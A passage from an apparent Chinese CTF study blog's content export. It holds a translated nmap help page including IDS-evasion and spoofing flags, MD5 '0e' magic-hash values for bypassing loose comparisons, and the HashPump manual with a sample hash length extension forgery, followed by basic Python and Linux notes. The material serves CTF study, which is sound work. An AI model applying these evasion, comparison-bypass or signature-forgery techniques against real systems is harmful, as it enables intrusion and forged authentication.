class="line">--version-light ：限制为最可能的探测器以便更快识别</span><br><span class="line">--version-all：尝试每个探测器进行版本检测</span><br><span class="line">--version-trace：显示详细的版本扫描活动（用于调试）</span><br><span class="line">OS检测：</span><br><span class="line">-O：启用OS检测</span><br><span class="line">--osscan-限制：将OS检测限制为有希望的目标</span><br><span class="line">--osscan-guess：更积极地猜测操作系统</span><br><span class="line">时间和性能：</span><br><span class="line">-T [0-6]：设置时序模板（更高更快）</span><br><span class="line">--min-hostgroup / max-hostgroup &lt;msec&gt;：并行主机扫描组大小</span><br><span class="line">--min-parallelism / max-parallelism &lt;msec&gt;：探测并行化</span><br><span class="line">--min-rtt-timeout / max-rtt-timeout / initial-rtt -timeout &lt;msec&gt;：指定</span><br><span class="line">探测往返时间。</span><br><span class="line">--host-timeout &lt;msec&gt;：在此长时间后放弃目标</span><br><span class="line">--scan-delay / - max-scan-delay &lt;msec&gt;：调整探测器之间的延迟</span><br><span class="line">防火墙/ IDS逃逸和施法：</span><br><span class="line">-f; --mtu &lt;val&gt;：片段包（可选择w /给定MTU）</span><br><span class="line">-D &lt;decoy1，decoy2 [，ME]，...&gt;：用decoys</span><br><span class="line">-S &lt;IP_Address&gt; 披露扫描：欺骗源地址</span><br><span class="line">-e &lt;iface &gt;：使用指定的接口</span><br><span class="line">-g / - <span class="built_in">source</span>-port &lt;portnum&gt;：</span><br><span class="line">--data-length &lt;num&gt;：将随机数据附加到已发送的数据包</span><br><span class="line">--ttl &lt;val&gt;：设置IP生存时间字段</span><br><span class="line">--spoof-mac &lt;mac地址，前缀或供应商名称&gt;：欺骗您的MAC地址</span><br><span class="line">OUTPUT：</span><br><span class="line">-oN / -oX / -oS / -oG &lt;file&gt;：输出扫描</span><br><span class="line">分别生成给定文件名的普通，XML，s | &lt;rIpt kIddi3 和Grepable格式。</span><br><span class="line">-oA &lt;basename&gt;：一次输出三种主要格式</span><br><span class="line">-v：增加详细级别（使用两次以获得更多效果）</span><br><span class="line">-d [level]：设置或增加调试级别（最多9个是有意义的） -</span><br><span class="line">packet-trace ：显示发送和接收的所有数据包</span><br><span class="line">--iflist：打印主机接口和路由（用于调试）</span><br><span class="line">--append-output：追加而不是clobber指定的输出文件</span><br><span class="line">--resume &lt;filename&gt;：恢复中止扫描</span><br><span class="line">--stylesheet &lt;path / URL&gt;：XSL样式表将XML输出转换为HTML</span><br><span class="line">--no-stylesheet：Prevent Nmap从关联XSL样式表到XML输出</span><br><span class="line">MISC：</span><br><span class="line">-6：启用IPv6扫描</span><br><span class="line">-A：启用OS检测和版本检测</span><br><span class="line">--datadir &lt;dirname&gt;：指定自定义Nmap数据文件位置</span><br><span class="line">--send-eth / - send-ip：使用原始以太网帧或IP数据包发送数据包</span><br><span class="line">--privileged：假设用户具有完全权限</span><br><span class="line">-V：打印版本号</span><br><span class="line">-h：打印此帮助摘要页面。</span><br><span class="line">例子：</span><br><span class="line">nmap -v -A scanme.nmap.org</span><br><span class="line">nmap -v -sP 192.168.0.0/16 10.0.0.0/8</span><br><span class="line">nmap -v -iR 10000 -P0 -p 80</span><br></pre></td></tr></table></figure><h1 id="各种工具集合"><a href="#各种工具集合" class="headerlink" title="各种工具集合"></a>各种工具集合</h1><p>1.<a href="http://tool.bugku.com/" target="_blank" rel="noopener">http://tool.bugku.com/</a></p><h2 id="js在线测试"><a href="#js在线测试" class="headerlink" title="js在线测试"></a>js在线测试</h2><p><a href="http://www.w3school.com.cn/tiy/t.asp?f=jseg_isNaN" target="_blank" rel="noopener">http://www.w3school.com.cn/tiy/t.asp?f=jseg_isNaN</a></p><h1 id="编码解码类"><a href="#编码解码类" class="headerlink" title="编码解码类"></a>编码解码类</h1><h2 id="xx加解密"><a href="#xx加解密" class="headerlink" title="xx加解密"></a>xx加解密</h2><p><a href="http://web.chacuo.net/charsetxxencode/" target="_blank" rel="noopener">http://web.chacuo.net/charsetxxencode/</a></p><h2 id="fastcoll（MD5-碰撞发生器）"><a href="#fastcoll（MD5-碰撞发生器）" class="headerlink" title="fastcoll（MD5 碰撞发生器）"></a>fastcoll（MD5 碰撞发生器）</h2><p>Allowed options:<br>  -h [ –help ]           显示选项。<br>  -q [ –quiet ]          更简洁。<br>  -i [ –ihv ] arg        使用指定的初始值。默认是MD5的初始值。<br>  -p [ –prefixfile ] arg 使用给定前缀的文件计算初始值，并复制数据到输出文件。<br>  -o [ –out ] arg        设置输出文件名. 这必须是最后的选项，并且必须指定两个文件名。<br>                          默认: -o msg1.bin msg2.bin</p><h2 id="md5加解密"><a href="#md5加解密" class="headerlink" title="md5加解密"></a>md5加解密</h2><p>注意：md5是16进制32位数字<br><a href="http://www.cmd5.com/" target="_blank" rel="noopener">http://www.cmd5.com/</a></p><h2 id="开头为0的md5值总结"><a href="#开头为0的md5值总结" class="headerlink" title="开头为0的md5值总结"></a>开头为0的md5值总结</h2><p>s878926199a<br>0e545993274517709034328855841020<br>s155964671a<br>0e342768416822451524974117254469<br>s214587387a<br>0e848240448830537924465865611904<br>s214587387a<br>0e848240448830537924465865611904<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s1885207154a<br>0e509367213418206700842008763514<br>s1502113478a<br>0e861580163291561247404381396064<br>s1885207154a<br>0e509367213418206700842008763514<br>s1836677006a<br>0e481036490867661113260034900752<br>s155964671a<br>0e342768416822451524974117254469<br>s1184209335a<br>0e072485820392773389523109082030<br>s1665632922a<br>0e731198061491163073197128363787<br>s1502113478a<br>0e861580163291561247404381396064<br>s1836677006a<br>0e481036490867661113260034900752<br>s1091221200a<br>0e940624217856561557816327384675<br>s155964671a<br>0e342768416822451524974117254469<br>s1502113478a<br>0e861580163291561247404381396064<br>s155964671a<br>0e342768416822451524974117254469<br>s1665632922a<br>0e731198061491163073197128363787<br>s155964671a<br>0e342768416822451524974117254469<br>s1091221200a<br>0e940624217856561557816327384675<br>s1836677006a<br>0e481036490867661113260034900752<br>s1885207154a<br>0e509367213418206700842008763514<br>s532378020a<br>0e220463095855511507588041205815<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s214587387a<br>0e848240448830537924465865611904<br>s1502113478a<br>0e861580163291561247404381396064<br>s1091221200a<br>0e940624217856561557816327384675<br>s1665632922a<br>0e731198061491163073197128363787<br>s1885207154a<br>0e509367213418206700842008763514<br>s1836677006a<br>0e481036490867661113260034900752<br>s1665632922a<br>0e731198061491163073197128363787<br>s878926199a<br>0e545993274517709034328855841020</p><h2 id="词频统计"><a href="#词频统计" class="headerlink" title="词频统计"></a>词频统计</h2><p><a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com/</a></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF在线工具集 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>HashPump用户手册</title>
      <link href="/2018/08-16-HashPump.html"/>
      <url>/2018/08-16-HashPump.html</url>
      <content type="html"><![CDATA[<h1 id="HashPump"><a href="#HashPump" class="headerlink" title="HashPump"></a>HashPump</h1><p>在各种散列算法中利用散列长度扩展攻击的工具。<br>目前支持的算法：MD5、SHA1、SHA256、SHA512。</p><h2 id="Help-Menu"><a href="#Help-Menu" class="headerlink" title="Help Menu"></a>Help Menu</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ hashpump -h</span><br><span class="line">HashPump [-h <span class="built_in">help</span>] [-t <span class="built_in">test</span>] [-s signature] [-d data] [-a additional] [-k keylength]</span><br><span class="line">    HashPump generates strings to exploit signatures vulnerable to the Hash Length Extension Attack.</span><br><span class="line">    -h --<span class="built_in">help</span>          Display this message.</span><br><span class="line">    -t --<span class="built_in">test</span>          Run tests to verify each algorithm is operating properly.</span><br><span class="line">    -s --signature     The signature from known message.</span><br><span class="line">    -d --data          The data from the known message.</span><br><span class="line">    -a --additional    The information you would like to add to the known message.</span><br><span class="line">    -k --keylength     The length <span class="keyword">in</span> bytes of the key being used to sign the original message with.</span><br><span class="line">    Version 1.2.0 with CRC32, MD5, SHA1, SHA256 and SHA512 support.</span><br><span class="line">    &lt;Developed by bwall(@botnet_hunter)&gt;</span><br></pre></td></tr></table></figure><h2 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hashpump -s <span class="string">'6d5f807e23db210bc254a28be2d6759a0f5f5d99'</span> --data <span class="string">'count=10&amp;lat=37.351&amp;user_id=1&amp;long=-119.827&amp;waffle=eggo'</span> -a <span class="string">'&amp;waffle=liege'</span> -k 14</span><br><span class="line">0e41270260895979317fff3898ab85668953aaa2</span><br><span class="line">count=10&amp;lat=37.351&amp;user_id=1&amp;long=-119.827&amp;waffle=eggo\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02(&amp;waffle=liege</span><br></pre></td></tr></table></figure><h2 id="Compile-amp-install"><a href="#Compile-amp-install" class="headerlink" title="Compile &amp; install"></a>Compile &amp; install</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/bwall/HashPump.git</span><br><span class="line">$ apt-get install g++ libssl-dev</span><br><span class="line">$ <span class="built_in">cd</span> HashPump</span><br><span class="line">$ make</span><br><span class="line">$ make install</span><br></pre></td></tr></table></figure><p><code>apt-get</code> and <code>make install</code> require root privileges to run correctly.  The actual requirement is for <code>-lcrypto</code>, so depending on your operating system, your dependencies may vary.</p><p>On OS X HashPump can also be installed using <a href="http://brew.sh/" target="_blank" rel="noopener">Homebrew</a>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ brew install hashpump</span><br></pre></td></tr></table></figure><h2 id="Mentions"><a href="#Mentions" class="headerlink" title="Mentions"></a>Mentions</h2><p>HashPump has been mentioned in a few write-ups.  If you are wondering how you can use HashPump, these are some great examples.</p><ul><li><a href="http://ctfcrew.org/writeup/54" target="_blank" rel="noopener">http://ctfcrew.org/writeup/54</a></li><li><a href="http://d.hatena.ne.jp/kusano_k/20140310/1394471922" target="_blank" rel="noopener">http://d.hatena.ne.jp/kusano_k/20140310/1394471922</a> (JP)</li><li><a href="http://conceptofproof.wordpress.com/2014/04/13/plaidctf-2014-web-150-mtgox-writeup/" target="_blank" rel="noopener">http://conceptofproof.wordpress.com/2014/04/13/plaidctf-2014-web-150-mtgox-writeup/</a></li><li><a href="http://achatz.me/plaid-ctf-mt-pox/" target="_blank" rel="noopener">http://achatz.me/plaid-ctf-mt-pox/</a></li><li><a href="http://herkules.oulu.fi/thesis/nbnfioulu-201401141005.pdf" target="_blank" rel="noopener">http://herkules.oulu.fi/thesis/nbnfioulu-201401141005.pdf</a></li><li><a href="https://github.com/ctfs/write-ups/tree/master/plaid-ctf-2014/mtpox" target="_blank" rel="noopener">https://github.com/ctfs/write-ups/tree/master/plaid-ctf-2014/mtpox</a></li></ul><h2 id="Python-Bindings"><a href="#Python-Bindings" class="headerlink" title="Python Bindings"></a>Python Bindings</h2><p>Fellow Python lovers will be pleased with this addition.  Saving me from writing an implementation of all these hash algorithms with the ability to modify states in Python, Python bindings have been added in the form of hashpumpy.  This addition comes from <a href="https://github.com/zachriggle" target="_blank" rel="noopener">zachriggle</a>.</p><h3 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h3><p>These Python bindings are available on <a href="https://pypi.python.org/pypi/hashpumpy/1.0" target="_blank" rel="noopener">PyPI</a> and can be installed via pip.<br>  pip install hashpumpy</p><h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><pre><code>&gt;&gt;&gt; import hashpumpy&gt;&gt;&gt; help(hashpumpy.hashpump)Help on built-in function hashpump in module hashpumpy:hashpump(...)    hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)    Arguments:        hexdigest(str):      Hex-encoded result of hashing key + original_data.        original_data(str):  Known data used to get the hash result hexdigest.        data_to_add(str):    Data to append        key_length(int):     Length of unknown data prepended to the hash    Returns:        A tuple containing the new hex digest and the new message.&gt;&gt;&gt; hashpumpy.hashpump(&apos;ffffffff&apos;, &apos;original_data&apos;, &apos;data_to_add&apos;, len(&apos;KEYKEYKEY&apos;))(&apos;e3c4a05f&apos;, &apos;original_datadata_to_add&apos;)</code></pre><h3 id="Python-3-note"><a href="#Python-3-note" class="headerlink" title="Python 3 note"></a>Python 3 note</h3><p>hashpumpy supports Python 3. Different from the Python 2 version, the second value (the new message) in the returned tuple from <code>hashpumpy.hashpump</code> is a bytes-like object instead of a string.</p>]]></content>
      
      <categories>
          
          <category> Document </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HashPump </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python</title>
      <link href="/2018/08-15-python.html"/>
      <url>/2018/08-15-python.html</url>
      <content type="html"><![CDATA[<h1 id="python基础"><a href="#python基础" class="headerlink" title="python基础"></a>python基础</h1><h2 id="python编码"><a href="#python编码" class="headerlink" title="python编码"></a>python编码</h2><p>Python2中默认的编码格式是 ASCII 格式，在没修改编码格式时无法正确打印汉字，所以在读取中文时会报错。解决方法为只要在文件开头加入<br>Python3.X 源码文件默认使用utf-8编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*- 或者 #coding=utf-8</span><br><span class="line">注意：#coding=utf-8 的 = 号两边不要空格。</span><br></pre></td></tr></table></figure><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="https://www.runoob.com/python/python-basic-syntax.html" target="_blank" rel="noopener">https://www.runoob.com/python/python-basic-syntax.html</a></p><h1 id="anaconda相关"><a href="#anaconda相关" class="headerlink" title="anaconda相关"></a>anaconda相关</h1><h2 id="python环境配置和切换"><a href="#python环境配置和切换" class="headerlink" title="python环境配置和切换"></a>python环境配置和切换</h2><h3 id="基于-python2-7-创建一个名为py2-7-的环境"><a href="#基于-python2-7-创建一个名为py2-7-的环境" class="headerlink" title="基于 python2.7 创建一个名为py2.7 的环境"></a>基于 python2.7 创建一个名为py2.7 的环境</h3><p>conda create –name test_py2 python=2.7</p><h3 id="激活-python2-7-环境"><a href="#激活-python2-7-环境" class="headerlink" title="激活 python2.7 环境"></a>激活 python2.7 环境</h3><p>activate py2.7 # windows<br>source activate py2.7 # linux/mac</p><h1 id="string库（包含了数字和字母集）"><a href="#string库（包含了数字和字母集）" class="headerlink" title="string库（包含了数字和字母集）"></a>string库（包含了数字和字母集）</h1><blockquote><p>digit是数字<br>lowercase 小写字母<br>#常用操作</p></blockquote><h2 id="切片操作"><a href="#切片操作" class="headerlink" title="切片操作"></a>切片操作</h2><p>print A[m:n]，即从m到n，不包括n，即A[0:3]为A[0,1,2]</p><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>coding=utf-8</p><h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><h2 id="去除列表中空字符串最快最简单的方法"><a href="#去除列表中空字符串最快最简单的方法" class="headerlink" title="去除列表中空字符串最快最简单的方法"></a>去除列表中空字符串最快最简单的方法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">filter(None, your_list)</span><br><span class="line"><span class="keyword">while</span> <span class="string">''</span> <span class="keyword">in</span> your_list:</span><br><span class="line">    your_list.remove(<span class="string">''</span>)</span><br><span class="line">和</span><br><span class="line">your_list = [x <span class="keyword">for</span> x <span class="keyword">in</span> your_list <span class="keyword">if</span> x != <span class="string">''</span>]</span><br></pre></td></tr></table></figure><h2 id="字符数字之间的转换函数"><a href="#字符数字之间的转换函数" class="headerlink" title="字符数字之间的转换函数"></a>字符数字之间的转换函数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int(x [,base ])         将x转换为一个整数    </span><br><span class="line">long(x [,base ])        将x转换为一个长整数    </span><br><span class="line"><span class="built_in">float</span>(x )               将x转换到一个浮点数    </span><br><span class="line">complex(real [,imag ])  创建一个复数    </span><br><span class="line">str(x )                 将对象 x 转换为字符串    </span><br><span class="line">repr(x )                将对象 x 转换为表达式字符串    </span><br><span class="line"><span class="built_in">eval</span>(str )              用来计算在字符串中的有效Python表达式,并返回一个对象    </span><br><span class="line">tuple(s )               将序列 s 转换为一个元组    </span><br><span class="line">list(s )                将序列 s 转换为一个列表    </span><br><span class="line">chr(x )                 将一个整数转换为一个字符    </span><br><span class="line">unichr(x )              将一个整数转换为Unicode字符    </span><br><span class="line">ord(x )                 将一个字符转换为它的整数值    </span><br><span class="line">hex(x )                 将一个整数转换为一个十六进制字符串    </span><br><span class="line">oct(x )                 将一个整数转换为一个八进制字符串</span><br></pre></td></tr></table></figure><h2 id="字符串和二进制的转换"><a href="#字符串和二进制的转换" class="headerlink" title="字符串和二进制的转换"></a>字符串和二进制的转换</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def encode(s):</span><br><span class="line">    <span class="built_in">return</span> <span class="string">' '</span>.join([bin(ord(c)).replace(<span class="string">'0b'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line">def decode(s):</span><br><span class="line">    <span class="built_in">return</span> <span class="string">''</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> [int(b, 2) <span class="keyword">for</span> b <span class="keyword">in</span> s.split(<span class="string">' '</span>)]])</span><br></pre></td></tr></table></figure><h3 id="8位二进制转换"><a href="#8位二进制转换" class="headerlink" title="8位二进制转换"></a>8位二进制转换</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def decode(s):</span><br><span class="line">    <span class="built_in">return</span> <span class="string">''</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> [int(b, 2) <span class="keyword">for</span> b <span class="keyword">in</span> s.split(<span class="string">' '</span>)]])</span><br><span class="line">st=<span class="string">'011001100110110001100001011001110111101101100011011001010011001101100101001101010011000000110010011000110010110100110100001110000110001100111001001011010011010001100100001101010011000000101101001110010011100100111001001100000010110100110101011000100011100000110001011001000110001000110110011001100110001101100010011001100011000001111101'</span></span><br><span class="line">result=<span class="string">''</span></span><br><span class="line">a=0</span><br><span class="line">b=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> st:</span><br><span class="line">    a+=1</span><br><span class="line">    b+=i</span><br><span class="line">    <span class="keyword">if</span> a==8:</span><br><span class="line">        result+=decode(b)</span><br><span class="line">        b=<span class="string">''</span></span><br><span class="line">        a=0</span><br><span class="line"><span class="built_in">print</span> result</span><br></pre></td></tr></table></figure><h2 id="join-和split-函数"><a href="#join-和split-函数" class="headerlink" title="join()和split()函数"></a>join()和split()函数</h2><p>Python中有join()和os.path.join()两个函数，具体作用如下：<br>    join()：    连接字符串数组。将字符串、元组、列表中的元素以指定的字符(分隔符)连接生成一个新的字符串<br>    os.path.join()：  将多个路径组合后返回<br>    1、join()函数</p><pre><code>语法：  &apos;sep&apos;.join(seq)参数说明sep：分隔符。可以为空seq：要连接的元素序列、字符串、元组、字典上面的语法即：以sep作为分隔符，将seq所有的元素合并成一个新的字符串返回值：返回一个以分隔符sep连接各个元素后生成的字符串2、os.path.join()函数语法：  os.path.join(path1[,path2[,......]])返回值：将多个路径组合后返回注：第一个绝对路径之前的参数将被忽略注：容器对象内的元素须为字符类型</code></pre><h3 id="join-示例"><a href="#join-示例" class="headerlink" title="join()示例"></a>join()示例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#对序列进行操作（分别使用' '与':'作为分隔符）</span></span><br><span class="line">&gt;&gt;&gt; seq1 = [<span class="string">'hello'</span>,<span class="string">'good'</span>,<span class="string">'boy'</span>,<span class="string">'doiido'</span>]</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> <span class="string">' '</span>.join(seq1)</span><br><span class="line">hello good boy doiido</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> <span class="string">':'</span>.join(seq1)</span><br><span class="line">hello:good:boy:doiido</span><br><span class="line"></span><br><span class="line"><span class="comment">#对字符串进行操作</span></span><br><span class="line">&gt;&gt;&gt; seq2 = <span class="string">"hello good boy doiido"</span></span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> <span class="string">':'</span>.join(seq2)</span><br><span class="line">h:e:l:l:o: :g:o:o:d: :b:o:y: :d:o:i:i:d:o</span><br><span class="line"></span><br><span class="line"><span class="comment">#对元组进行操作</span></span><br><span class="line">&gt;&gt;&gt; seq3 = (<span class="string">'hello'</span>,<span class="string">'good'</span>,<span class="string">'boy'</span>,<span class="string">'doiido'</span>)</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> <span class="string">':'</span>.join(seq3)</span><br><span class="line">hello:good:boy:doiido</span><br><span class="line"></span><br><span class="line"><span class="comment">#对字典进行操作:   dict是以Key值作连接, #dict 的无序性，使元素随机连接。set 同理</span></span><br><span class="line">&gt;&gt;&gt; seq4 = &#123;<span class="string">'hello'</span>:1,<span class="string">'good'</span>:2,<span class="string">'boy'</span>:3,<span class="string">'doiido'</span>:4&#125;</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> <span class="string">':'</span>.join(seq4)</span><br><span class="line">boy:good:doiido:hello</span><br><span class="line"></span><br><span class="line"><span class="comment">#合并目录</span></span><br><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; os.path.join(<span class="string">'hello'</span>,<span class="string">'goodboy'</span>,<span class="string">'doiido'</span>)</span><br><span class="line"><span class="string">'hello\goodboy\doiido'</span>   <span class="comment">#windows platform auto add \ between each string</span></span><br><span class="line"><span class="string">'hello/goodboy/doiido'</span>      <span class="comment">#linux platform auto add / between each string</span></span><br></pre></td></tr></table></figure><p>Python中有split()和os.path.split()两个函数，具体作用如下：<br>split()：拆分字符串。通过指定分隔符对字符串进行切片，并返回分割后的字符串列表（list）<br>os.path.split()：按照路径将文件名和路径分割开<br>Python中的spilt方法只能通过指定的某个字符分割字符串，如果需要指定多个字符，需要用到re模块里的split方法。<br>例子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import re</span><br><span class="line">&gt;&gt;&gt; a = <span class="string">"Hello world!How are you?My friend.Tom"</span></span><br><span class="line">&gt;&gt;&gt; re.split(<span class="string">" |!|\?|\."</span>, a)  </span><br><span class="line">[<span class="string">'Hello'</span>, <span class="string">'world'</span>, <span class="string">'How'</span>, <span class="string">'are'</span>, <span class="string">'you'</span>, <span class="string">'My'</span>, <span class="string">'friend'</span>, <span class="string">'Tom'</span>]</span><br></pre></td></tr></table></figure><h1 id="编码-1"><a href="#编码-1" class="headerlink" title="编码"></a>编码</h1><h2 id="1、查看文件编码方式"><a href="#1、查看文件编码方式" class="headerlink" title="1、查看文件编码方式"></a>1、查看文件编码方式</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import chardet</span><br><span class="line">fobj=open(fname,<span class="string">'r'</span>)</span><br><span class="line">data=fobj.read()</span><br><span class="line"><span class="built_in">print</span> chardet.detect(data)[<span class="string">'encoding'</span>]</span><br></pre></td></tr></table></figure><h2 id="2、编码类型转换"><a href="#2、编码类型转换" class="headerlink" title="2、编码类型转换"></a>2、编码类型转换</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python默认使用unicode字符集，默认编码方式utf-8.</span><br><span class="line">str.decode(<span class="string">'gbk'</span>)    <span class="comment">#将gbk编码的字符串转换成unicode编码</span></span><br><span class="line">str.encode(<span class="string">'gbk'</span>)    <span class="comment">#将unicode编码的字符串转换成gbk编码</span></span><br></pre></td></tr></table></figure><h1 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h1><h2 id="逐行读取"><a href="#逐行读取" class="headerlink" title="逐行读取"></a>逐行读取</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">with open(<span class="string">'song.txt'</span>, <span class="string">'r'</span>, encoding=<span class="string">'utf-8'</span>) as f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="built_in">print</span>(line)</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> Document </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux基础</title>
      <link href="/2018/08-15-Linux.html"/>
      <url>/2018/08-15-Linux.html</url>
      <content type="html"><![CDATA[<h1 id="Linux的基本概念"><a href="#Linux的基本概念" class="headerlink" title="Linux的基本概念"></a>Linux的基本概念</h1><h1 id="Linux的目录结构"><a href="#Linux的目录结构" class="headerlink" title="Linux的目录结构"></a>Linux的目录结构</h1><h1 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h1><h2 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">ls                  用来显示目标列表</span><br><span class="line"><span class="built_in">cd</span> [path]           用来切换工作目录</span><br><span class="line"><span class="built_in">pwd</span>                 以绝对路径的方式显示用户当前工作目录</span><br><span class="line">man [<span class="built_in">command</span>]       查看Linux中的指令帮助、配置文件帮助和编程帮助等信息</span><br><span class="line">apropos [whatever]  在一些特定的包含系统命令的简短描述的数据库文件里查找关键字</span><br><span class="line"><span class="built_in">echo</span> [string]       打印一行文本，参数“-e”可激活转义字符</span><br><span class="line">cat [file]          连接文件并打印到标准输出设备上</span><br><span class="line">less [file]         允许用户向前或向后浏览文字档案的内容</span><br><span class="line">mv [file1] [file2]  用来对文件或目录重新命名，或者将文件从一个目录移到另一个目录中</span><br><span class="line">cp [file1] [file2]  用来将一个或多个源文件或者目录复制到指定的目的文件或目录</span><br><span class="line">rm [file]           可以删除一个目录中的一个或多个文件或目录，也可以将某个目录及其下属的所有文件及其子目录均删除掉</span><br><span class="line">ps                  用于报告当前系统的进程状态</span><br><span class="line">top                 实时查看系统的整体运行情况</span><br><span class="line"><span class="built_in">kill</span>                杀死一个进程</span><br><span class="line">ifconfig            查看或设置网络设备</span><br><span class="line">ping                